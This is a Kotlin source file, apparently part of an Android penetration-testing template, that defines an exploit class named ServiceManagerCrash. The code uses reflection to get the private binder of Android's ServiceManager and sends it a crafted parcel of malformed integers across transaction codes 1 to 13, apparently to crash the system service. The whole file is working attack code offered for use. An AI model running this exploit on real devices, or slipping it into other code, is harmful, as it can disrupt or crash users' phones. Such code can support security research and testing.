package org.chickenhook.AndroidHackingTemplate.penetration

import android.annotation.SuppressLint
import android.content.Context
import android.os.IBinder
import android.os.Parcel
import android.os.SystemClock
import android.util.Log

class ServiceManagerCrash : IExploit {
    @SuppressLint("BlockedPrivateApi")
    override fun launch(context: Context?): Boolean {

        var f = Class.forName("android.os.ServiceManager").getDeclaredField("sServiceManager")
        f.isAccessible = true
        val serviceManagerProxy = f[null]
        f = Class.forName("android.os.ServiceManagerProxy").getDeclaredField("mServiceManager")
        f.isAccessible = true
        val serviceManager = f.get(serviceManagerProxy);
        val mRemoteField = serviceManager::class.java.getDeclaredField("mRemote")
        mRemoteField.isAccessible = true
        val mRemote = mRemoteField.get(serviceManager) as IBinder
        Log.d("ServiceManagerCrash", "Got binder object <$mRemote>")



        val data = Parcel.obtain();
        data.writeInterfaceToken("android.os.IServiceManager")
        val l1 = intArrayOf(
            0xff00000, // 0x73622a85
            0x00000113,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            -1,
            -1
        )
        l1.forEach {
            data.writeInt(it)
        }

        val reply = Parcel.obtain()
        for(i in 1..13) {
            val res = mRemote.transact(i, data, reply, 17)
        }



        SystemClock.sleep(2000)

        return false;
    }
}